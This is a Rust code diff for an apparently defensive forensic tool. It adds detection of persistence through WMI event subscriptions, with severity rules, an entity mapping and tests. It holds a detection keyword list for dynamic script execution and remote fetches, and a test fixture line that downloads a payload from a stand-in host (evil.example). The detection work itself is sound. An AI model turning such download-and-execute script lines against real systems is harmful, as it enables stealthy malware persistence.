@@ -141,6 +141,52 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
         });
     }
 
+    // S1c: WMI event subscription persistence. Rare by nature — a normal system has no
+    // user-authored WMI permanent event subscriptions — so any binding gates
+    // unconditionally, mirroring S1b's "always gate" posture for IFEO. Severity is
+    // determined by content inspection because ActiveScriptEventConsumer entries have no
+    // invoked executable (binary_path is None by construction — see
+    // cairn-collectors::wmi_subscription::extract_binary_path) for S9 to pattern-match
+    // against; CommandLineEventConsumer entries (binary_path is Some) are left to the
+    // normal S2/S3/S4/S9 checks below instead of an extra unconditional branch here.
+    // (CommandLineEventConsumer entries, where binary_path is Some, are deliberately left
+    // to the normal S2/S3/S4/S9 checks below rather than an extra unconditional branch
+    // here; wmi_subscription must NOT be added to any "exempt from path signals" list,
+    // unlike startup, so those checks apply normally to it.)
+    if p.mechanism == "wmi_subscription" && p.binary_path.is_none() {
+        let content = p.command.as_deref().unwrap_or("");
+        let lower = content.to_ascii_lowercase();
+        let suspicious = content.contains("Chr(")
+            || content.contains("Eval(")
+            || content.contains("ExecuteGlobal")
+            || content.contains("XMLHTTP")
+            || content.contains("WinHttp.WinHttpRequest")
+            || lower.contains("http://")
+            || lower.contains("https://");
+        hits.push(GateHit {
+            severity: if suspicious {
+                Severity::High
+            } else {
+                Severity::Medium
+            },
+            label: "WMI 事件訂閱腳本持久化",
+            reason: if suspicious {
+                format!(
+                    "WMI event subscription runs an inline script referencing dynamic \
+                     execution or remote content (no invoked executable exists for S9 \
+                     to see): {content}"
+                )
+            } else {
+                format!(
+                    "WMI event subscription runs an inline script with no invoked \
+                     executable; no obviously suspicious pattern found, but WMI \
+                     subscriptions are unusual enough to warrant review: {content}"
+                )
+            },
+            mitre: "T1546.003",
+        });
+    }
+
     // The Startup folder (%APPDATA%\...\Startup or the all-users ProgramData twin) IS the
     // persistence location itself, not an arbitrary drop zone — every mechanism's binary_path
     // signal (S2/S3/S4) assumes the path is where an attacker CHOSE to hide the binary. For
@@ -552,6 +598,22 @@ fn persistence_entity(p: &PersistenceRecord) -> Entity {
                 si_mtime: None,
                 fn_mtime: None,
                 path_complete: None,
+            }),
+            ..Entity::default()
+        }
+    } else if p.mechanism == "wmi_subscription" {
+        // WMI subscriptions have no registry key or file path of their own — location
+        // holds "<filter> -> <consumer>" (see cairn-collectors::wmi_subscription). Reuse
+        // entity.registry's key field for this identifier rather than adding a new Entity
+        // sub-object for a single mechanism (schema stays unchanged; the field's semantics
+        // — "where this persistence mechanism lives in the system" — already fit).
+        Entity {
+            registry: Some(EntityRegistry {
+                hive: "WMI".to_string(),
+                key: p.location.clone(),
+                value: p.value.clone().unwrap_or_default(),
+                data: p.command.clone().unwrap_or_default(),
+                last_write: p.last_write,
             }),
             ..Entity::default()
         }
@@ -1178,5 +1240,96 @@ mod tests {
             "unmatched full path must not degrade to basename guess"
         );
         assert!(!degraded);
+    }
+
+    // ── S1c: WMI event subscription persistence ─────────────────────────────
+
+    #[test]
+    fn gate_s1c_wmi_active_script_with_suspicious_content_is_high() {
+        let now = Utc::now();
+        let p = full_rec(
+            "wmi_subscription",
+            Some("EvilConsumer"),
+            Some(r#"CreateObject("Msxml2.XMLHTTP").Open("GET","http://evil.example/payload")"#),
+            None,
+            None,
+            None,
+        );
+        let hits = evaluate_gate(&p, now);
+        assert!(
+            !hits.is_empty(),
+            "WMI ActiveScript with remote content must gate"
+        );
+        assert!(
+            hits.iter().any(|h| h.severity == Severity::High),
+            "suspicious script content must be High severity"
+        );
+    }
+
+    #[test]
+    fn gate_s1c_wmi_active_script_benign_content_gates_but_not_high() {
+        let now = Utc::now();
+        let p = full_rec(
+            "wmi_subscription",
+            Some("BenignConsumer"),
+            Some("MsgBox \"hello\""),
+            None,
+            None,
+            None,
+        );
+        let hits = evaluate_gate(&p, now);
+        assert!(
+            !hits.is_empty(),
+            "WMI subscriptions gate unconditionally (rare mechanism)"
+        );
+        assert!(
+            hits.iter().all(|h| h.severity != Severity::High),
+            "benign script content must not be High severity"
+        );
+    }
+
+    #[test]
+    fn gate_s1c_wmi_command_line_consumer_with_invoked_executable_uses_existing_signals() {
+        // A CommandLineEventConsumer HAS an invoked executable, so it must be evaluated by
+        // the normal S2-S4/S9 path (binary_path is Some), not the unconditional S1c branch.
+        let now = Utc::now();
+        let p = full_rec(
+            "wmi_subscription",
+            Some("Consumer"),
+            Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe"),
+            Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe"),
+            Some(false),
+            None,
+        );
+        let hits = evaluate_gate(&p, now);
+        assert!(
+            !hits.is_empty(),
+            "unsigned executable in a user-writable path must still gate via S2"
+        );
+        assert!(
+            hits.iter().all(|h| h.label != "WMI 事件訂閱腳本持久化"),
+            "a CommandLineEventConsumer with binary_path must not trigger the S1c branch"
+        );
+    }
+
+    #[test]
+    fn wmi_subscription_uses_registry_entity_with_wmi_hive_marker() {
+        let p = PersistenceRecord {
+            mechanism: "wmi_subscription".into(),
+            location: "Filter -> Consumer".into(),
+            value: Some("Consumer".into()),
+            command: Some("MsgBox 1".into()),
+            binary_path: None,
+            binary_sha256: None,
+            signed: None,
+            signer: None,
+            last_write: None,
+        };
+        let entity = persistence_entity(&p);
+        let reg = entity
+            .registry
+            .expect("wmi_subscription must populate entity.registry");
+        assert_eq!(reg.hive, "WMI");
+        assert_eq!(reg.key, "Filter -> Consumer");
     }
 }
